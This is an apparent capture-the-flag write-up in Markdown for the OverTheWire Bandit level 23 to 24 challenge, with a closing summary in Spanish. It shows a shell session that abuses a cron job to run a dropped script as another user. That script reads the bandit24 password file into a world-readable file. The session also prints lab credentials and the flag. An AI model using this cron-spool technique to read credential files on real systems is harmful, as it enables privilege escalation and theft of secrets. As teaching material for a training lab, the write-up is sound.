# Level-23 -> Level-24

### Level Goat
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
### Credentials
ssh bandit23@bandit.labs.overthewire.org -p 2220
password: **QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G**
### Solution
```shell                          
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/passtmp
bandit23@bandit:~$ cd /tmp/passtmp
bandit23@bandit:/tmp/passtmp$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/passtmp/password" > mio.sh 
bandit23@bandit:/tmp/passtmp$ ls
mio.sh
bandit23@bandit:/tmp/passtmp$ cat mio.sh 
cat /etc/bandit_pass/bqandit24 >> /tmp/passtmp/password
bandit23@bandit:/tmp/passtmp$ chmod 777 mio.sh 
bandit23@bandit:/tmp/passtmp$ touch password
bandit23@bandit:/tmp/passtmp$ chmod 666 password 


bandit23@bandit:/tmp/passtmp$ cp mio.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/passtmp$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23 55 Aug 31 20:37 mio.sh
-rw-rw-rw- 1 bandit23 bandit23  0 Aug 31 20:38 password
bandit23@bandit:/tmp/passtmp$ ls -l
total 8
-rwxrwxrwx 1 bandit23 bandit23 55 Aug 31 20:37 mio.sh
-rw-rw-rw- 1 bandit23 bandit23 33 Aug 31 20:44 password

bandit23@bandit:/tmp/passtmp$ cat password 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/passtmp$
```
### Summary
observamos el script que se ejecuta en el crontab y nos damos cuenta que lo que hace es ejecutar todos los scripts que estén en la carpeta /var/spool/$myname/foo y después los elimina así que metemos un script a esa carpeta que lo que haga es leer la contraseña del usuario y mandarla a un archivo al que tengamos acceso 
## Script
![[mio.sh]]
### FLAG
**VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar** 